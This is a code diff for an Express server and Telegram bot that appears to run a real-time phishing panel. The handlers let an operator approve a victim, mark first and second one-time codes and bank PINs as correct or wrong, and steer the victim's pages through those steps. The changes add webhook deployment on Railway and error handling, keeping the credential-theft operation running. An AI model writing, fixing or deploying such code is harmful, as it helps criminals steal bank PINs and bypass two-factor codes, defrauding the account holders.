@@ -5,6 +5,8 @@ require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 8080;
+// Railway provides RAILWAY_PUBLIC_URL automatically, or you can use your custom domain variable
+const DOMAIN = process.env.RAILWAY_PUBLIC_URL || process.env.DOMAIN || ""; 
 
 // -------------------- INIT BOT --------------------
 if (!process.env.BOT_TOKEN) {
@@ -20,6 +22,10 @@ const statusStore = {};
 // -------------------- MIDDLEWARE --------------------
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
+
+// Set up Telegram webhook route handler before catch-all routes
+const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
+app.use(bot.webhookCallback(WEBHOOK_PATH));
 
 // -------------------- ROUTES --------------------
 app.get('/', (req, res) => {
@@ -260,9 +266,11 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
 ➡️ <b>Next: First OTP (1/2)</b>
 ⏱️ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Allowed");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(approvedMsg);
+    try {
+        await ctx.answerCbQuery("Allowed");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(approvedMsg);
+    } catch (e) { console.error(e); }
 });
 
 // DENY
@@ -283,9 +291,11 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
 ❌ <b>Status: Rejected</b>
 ⏱️ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Rejected");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(deniedMsg);
+    try {
+        await ctx.answerCbQuery("Rejected");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(deniedMsg);
+    } catch (e) { console.error(e); }
 });
 
 // OTP1 CORRECT
@@ -307,18 +317,22 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
 ➡️ <b>Next: Second OTP (2/2) will be sent</b>
 ⌛ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Verified");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(verifiedMsg);
+    try {
+        await ctx.answerCbQuery("Verified");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(verifiedMsg);
+    } catch (e) { console.error(e); }
 });
 
 // OTP1 WRONG
 bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp1_wrong";
-    await ctx.answerCbQuery("Wrong Code");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+    try {
+        await ctx.answerCbQuery("Wrong Code");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+    } catch (e) { console.error(e); }
 });
 
 // OTP2 CORRECT
@@ -340,18 +354,22 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
 ✅ <b>Process Complete</b>
 ⌛ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("Finalized");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(verifiedMsg2);
+    try {
+        await ctx.answerCbQuery("Finalized");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(verifiedMsg2);
+    } catch (e) { console.error(e); }
 });
 
 // OTP2 WRONG
 bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrong";
-    await ctx.answerCbQuery("Wrong Code");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+    try {
+        await ctx.answerCbQuery("Wrong Code");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+    } catch (e) { console.error(e); }
 });
 
 // BANK PIN CORRECT
@@ -371,27 +389,33 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
 ✅ <b>Status: Process Completed</b>
 🏁 <b>User redirected to Success page</b>`;
 
-    await ctx.answerCbQuery("Bank PIN Verified");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(finalizedMsg);
+    try {
+        await ctx.answerCbQuery("Bank PIN Verified");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(finalizedMsg);
+    } catch (e) { console.error(e); }
 });
 
 // BANK PIN WRONG
 bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "bank_pin_wrong";
-    await ctx.answerCbQuery("Wrong Bank PIN");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
+    try {
+        await ctx.answerCbQuery("Wrong Bank PIN");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
+    } catch (e) { console.error(e); }
 });
 
 // OTP2 WRONG PIN
 bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp2_wrongpin";
-    await ctx.answerCbQuery("Wrong PIN");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
+    try {
+        await ctx.answerCbQuery("Wrong PIN");
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+        await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
+    } catch (e) { console.error(e); }
 });
 
 // -------------------- STATUS CHECK --------------------
@@ -402,7 +426,7 @@ app.get('/api/check-status', (req, res) => {
 
 // -------------------- SAFE PAGE ROUTE --------------------
 app.get('/:page', (req, res, next) => {
-    if (req.params.page.startsWith('api')) return next();
+    if (req.params.page.startsWith('api') || req.params.page.startsWith('webhook')) return next();
     const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
     res.sendFile(path.join(__dirname, 'public', file), (err) => {
         if (err) res.status(404).send("Page not found");
@@ -413,14 +437,18 @@ app.get('/:page', (req, res, next) => {
 app.listen(PORT, async () => {
     console.log(`🚀 Server running on port ${PORT}`);
     try {
-        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
-        bot.launch();
-        console.log("🤖 Bot is active");
+        if (DOMAIN) {
+            // Clean dynamic URL formats to make sure it includes protocol
+            const formattedDomain = DOMAIN.startsWith('http') ? DOMAIN : `https://${DOMAIN}`;
+            await bot.telegram.setWebhook(`${formattedDomain}${WEBHOOK_PATH}`, {
+                drop_pending_updates: true
+            });
+            console.log(`🤖 Bot Webhook set up successfully at: ${formattedDomain}${WEBHOOK_PATH}`);
+        } else {
+            console.warn("⚠️ No RAILWAY_PUBLIC_URL or DOMAIN found. Webhook configuration skipped.");
+        }
     } catch (err) {
-        console.error("Launch error:", err);
+        console.error("Webhook registration error:", err);
     }
 });
-
-// Graceful stop
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
+        
